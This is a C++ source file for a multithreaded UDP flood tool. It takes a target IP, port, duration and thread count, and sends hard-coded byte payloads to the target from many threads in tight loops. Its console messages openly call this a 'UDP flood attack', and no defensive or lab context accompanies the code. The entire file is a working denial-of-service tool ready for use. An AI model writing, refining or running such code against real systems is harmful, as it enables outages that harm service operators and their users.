

#include <iostream>
#include <thread>
#include <vector>
#include <cstring>
#include <arpa/inet.h>  // For socket-related functions on Linux
#include <sys/socket.h>
#include <unistd.h>
#include <cstdlib>
#include <ctime>
#include <chrono>

// Array of payloads
const char* payloads[] = {
    "\x08\xb2\x00\x21",
    "\x08\xb2\x00",
    "\xD8\x39\x84\x00", 
};

// Function to send all UDP payloads at the same time with error handling
void send_udp_message(const std::string& ip, int port, bool& stop_flag) {
    int sockfd;
    struct sockaddr_in server_addr;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        std::cerr << "Socket creation failed\n";
        return;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

    int num_payloads = sizeof(payloads) / sizeof(payloads[0]); // Get the number of payloads

    while (!stop_flag) {
        for (int i = 0; i < num_payloads; ++i) {
            ssize_t bytes_sent = sendto(sockfd, payloads[i], strlen(payloads[i]), 0, (const struct sockaddr*)&server_addr, sizeof(server_addr));

            if (bytes_sent == -1) {
                std::cerr << "Error sending payload " << i + 1 << ": " << strerror(errno) << "\n";
            }
        }
    }
    close(sockfd);
}

void udp_flood_thread(const std::string& ip, int port, bool& stop_flag) {
    send_udp_message(ip, port, stop_flag);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Duration (seconds)> <Number of Threads>\n";
        return 1;
    }

    const std::string ip = argv[1];
    const int port = std::stoi(argv[2]);
    const int duration = std::stoi(argv[3]); 
    const int thread_count = std::stoi(argv[4]); 

    srand(time(0));  // Seed for random number generation (not needed for hex payloads but kept for consistency)
    

    std::cout << "Starting UDP flood attack on " << ip << ":" << port << " for " << duration << " seconds with " << thread_count << " threads.\n";

    // Spawn multiple threads to send UDP payloads simultaneously
    // The stop_flag is used to stop all threads when the attack duration is reache

    std::vector<std::thread> threads;
    bool stop_flag = false;

    for (int i = 0; i < thread_count; ++i) {
        threads.emplace_back(udp_flood_thread, ip, port, std::ref(stop_flag));
    }

    std::this_thread::sleep_for(std::chrono::seconds(duration));

    stop_flag = true;

    for (auto& th : threads) {
        th.join();
    }

    std::cout << "UDP flood attack finished after " << duration << " seconds.\n";

    return 0;
}


